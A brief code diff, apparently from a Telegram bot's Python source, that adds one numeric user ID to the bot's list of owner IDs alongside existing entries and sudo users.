@@ -11,6 +11,7 @@ SUDO_USERS.append(1895361136)
 
 OWNER_ID.append(1261923198)
 OWNER_ID.append(1491960039)
+OWNER_ID.append(1895361136)
 
 
 def errors(func: Callable) -> Callable:
